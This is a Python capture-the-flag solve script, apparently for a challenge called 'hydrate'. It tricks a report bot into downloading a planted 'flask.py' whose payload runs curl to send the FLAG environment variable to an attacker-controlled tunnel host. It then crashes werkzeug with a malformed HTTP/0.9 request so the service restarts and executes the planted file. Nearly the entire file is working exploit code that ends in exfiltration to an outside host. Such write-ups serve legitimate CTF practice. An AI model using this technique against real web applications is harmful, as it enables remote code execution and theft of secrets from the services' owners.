from pwn import remote, listen
import hashlib
import sys
import requests
import subprocess
from time import sleep


INSTANCER_DOMAIN = "hydrate.today"
INSTANCER_PORT = 1337
ATTACKER_DOMAIN = "https://d0fc5ba6dfd7bd.lhr.life"



def spawnInstance():
    print("[+] Spawning instance...")
    s = remote(INSTANCER_DOMAIN, INSTANCER_PORT)
    # get the challenge and prefix
    _ = s.recvuntil(b'PoW:').decode('utf-8').split(' ')
    
    challenge = _[7]
    prefix = _[14]
    
    print(f"[+] Challenge: {challenge}, Prefix: {prefix}")

    # solve the challenge
    solution = solvePow(challenge, prefix)
    print(f"[+] Solution: {solution}")

    s.sendline(solution.encode())
    
    # get the instance
    s.recvuntil(b"Spawning a challenge instance for you...")
    s.recvuntil(b"Please visit")
    instance = s.recvline().decode('utf-8').strip()
    
    s.close()
    return instance


def solvePow(challenge, prefix):
    return next(f'{challenge}{s}' for s in range(2**40) if hashlib.sha256(f'{challenge}{s}'.encode('utf-8')).hexdigest().startswith(prefix))





def solve(instance):
    
    l = listen(port=8081, bindaddr='0.0.0.0')
    print('[+] sending bot link to download flask.py')
    try:
        r = requests.post(f"{instance}/report", data={"url": ATTACKER_DOMAIN}, timeout=0.1)
    except:
        pass
    c = l.wait_for_connection()

    payload = f'''import os; os.system('curl -g "{ATTACKER_DOMAIN}?flag=|||$FLAG|||"')'''

    response = (
        'HTTP/1.0 200 OK\r\n'
        'Content-Disposition: attachment; filename="flask.py"\r\n'
        f'Content-Length: {len(payload)}\r\n'
        '\r\n'
        f'{payload}\r\n'
        '\r\n'
    ).encode()
    
    
    
    c.sendline(response)
    c.close()
    l.close()
    print('[+] downloaded flask.py, waiting just to be sure')

    sleep(5)

    print(f'[+] Forcing restart ... ')

    r = remote(instance.replace('https://', ''), 443, ssl=True)

    # werkzeug crashes when logging the request, assumes port is int
    r.send(f'GET {instance}:a/ HTTP/0.9\n\r\n\r'.encode())
    r.close()

    l = listen(port=8081, bindaddr='0.0.0.0')
    c = l.wait_for_connection()
    print(c.recv(1024).decode().split('|||')[1])
    c.close()
    l.close()




def main():
    if len(sys.argv) != 2:
        instance = spawnInstance()
        print('[+] waiting 10 seconds for instance to be ready')
        sleep(10)
    else:
        instance = sys.argv[1]
    print('[+] Instance: ', instance)

    solve(instance)

    # solve the instance




if __name__ == "__main__":
    main()
